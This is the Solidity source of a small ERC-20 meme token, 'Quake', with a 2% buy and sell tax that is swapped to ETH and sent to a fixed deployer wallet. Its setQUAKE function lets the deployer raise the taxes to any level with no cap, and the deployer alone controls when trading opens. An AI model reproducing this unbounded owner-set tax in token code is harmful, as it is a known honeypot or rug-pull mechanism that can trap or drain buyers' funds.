/**
 *Submitted for verification at Etherscan.io on 2023-10-12
*/

/*

Quake - Celebrating the 25th anniversary of Win98.

1,000,000 $QUAKE
2/2 Tax

Telegram - https://t.me/QuakePortal
Twitter - https://twitter.com/QuakeERC
Website - https://quake.homes

*/
// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.20;

    interface IUniswapV2Router02 {
        function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
            ) external;
        }
        
    contract Quake {
        string public constant name = "Quake";  //
        string public constant symbol = "QUAKE";  //
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 1_000_000 * 10**decimals;

        uint256 BurnToken = 2;
        uint256 SpendToken = 2;
        uint256 constant swapAmount = totalSupply / 100;

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;
            
        error Permissions();
            
        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed owner,
            address indexed spender,
            uint256 value
        );
            

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant deployer = payable(address(0xB8431a0ABE05F65789f72EA09e1f8cbd601a7542)); //

        bool private swapping;
        bool private tradingOpen;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

         receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == deployer || to == deployer);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                    );
                deployer.transfer(address(this).balance);
                swapping = false;
                }

            if(from != address(this)){
                uint256 taxAmount = amount * (from == pair ? BurnToken : SpendToken) / 100;
                amount -= taxAmount;
                balanceOf[address(this)] += taxAmount;
            }
                balanceOf[to] += amount;
                emit Transfer(from, to, amount);
                return true;
            }

        function openTrading() external {
            require(msg.sender == deployer);
            require(!tradingOpen);
            tradingOpen = true;        
            }

            function _setQUAKE(uint256 newBurn, uint256 newSpend) private {
            BurnToken = newBurn;
            SpendToken = newSpend;
            }

        function setQUAKE(uint256 newBurn, uint256 newSpend) external {
            if(msg.sender != deployer)        
                revert Permissions();
            _setQUAKE(newBurn, newSpend);
            }
        }